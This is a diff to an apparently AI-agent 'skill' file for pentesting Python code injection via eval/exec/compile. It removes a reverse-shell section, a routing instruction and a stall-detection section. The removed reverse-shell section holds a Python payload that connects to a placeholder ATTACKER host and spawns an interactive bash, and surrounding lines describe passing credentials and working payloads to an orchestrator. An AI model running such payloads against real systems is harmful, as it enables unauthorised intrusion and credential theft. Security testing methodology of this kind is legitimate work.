@@ -54,14 +54,12 @@ When an engagement directory exists:
 
 This skill covers Python code injection through eval(), exec(), and compile()
 — from confirming the injection through achieving OS command execution. When
-you reach the boundary of this scope — whether through a routing instruction
-("Route to **skill-name**") or by discovering findings outside your domain —
+you reach the boundary of this scope — whether through completing your methodology or discovering findings outside your domain —
 **STOP**.
 
 Do not load or execute another skill. Do not continue past your scope boundary.
 Instead, return to the orchestrator with:
   - What was found (vulns, credentials, access gained)
-  - Recommended next skill (the bold **skill-name** from routing instructions)
   - Context to pass (injection point, target, working payloads, etc.)
 
 The orchestrator decides what runs next. Your job is to execute this skill
@@ -528,25 +526,6 @@ curl -s -X POST http://TARGET/endpoint \
 
 ## Step 6: Escalate or Pivot
 
-### Reverse Shell via MCP
-
-When RCE is confirmed, **prefer catching a reverse shell via the MCP
-shell-server** over continuing to inject Python code through the vulnerable
-parameter.
-
-1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
-2. Send a reverse shell payload through the injection point:
-   ```python
-   __import__('os').system('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'')
-   ```
-3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
-4. Use `send_command()` for all subsequent commands
-
-If the target lacks outbound connectivity, continue with inline command
-execution and note the limitation in the engagement state.
-
-After achieving command execution:
-
 ### Credential-Based Access Handoff
 
 When code injection reveals credentials (config files, git repos, environment
@@ -585,41 +564,6 @@ If credentials aren't found but command execution is confirmed:
 
 When routing, always pass along: injection point, working payload, target
 platform, and any credentials found.
-
-## Stall Detection
-
-If you have spent **5 or more tool-calling rounds** on the same failure with
-no meaningful progress — same error, no new information, no change in output
-— **stop**.
-
-**What counts as progress:**
-- Trying a variant or alternative **documented in this skill**
-- Adjusting syntax, flags, or parameters per the Troubleshooting section
-- Gaining new diagnostic information (different error, partial success)
-
-**What does NOT count as progress:**
-- Writing custom exploit code not provided in this skill
-- Inventing workarounds using techniques from other domains
-- Retrying the same command with trivially different input
-- Compiling or transferring tools not mentioned in this skill
-
-If you find yourself writing code that isn't in this skill, you have left
-methodology. That is a stall.
-
-Do not loop. Work through failures systematically:
-1. Try each variant or alternative **once**
-2. Check the Troubleshooting section for known fixes
-3. If nothing works after 5 rounds, you are stalled
-
-**When stalled, return to the orchestrator immediately with:**
-- What was attempted (commands, variants, alternatives tried)
-- What failed and why (error messages, empty responses, timeouts)
-- Assessment: **blocked** (permanent — config, patched, missing prereq) or
-  **retry-later** (may work with different context, creds, or access)
-
-**When stalled:** Tell the user you're stalled, present what was tried, and
-recommend the next best path. Return findings to the orchestrator — it will
-decide whether to revisit with new context or route elsewhere.
 
 ## OPSEC Notes
 
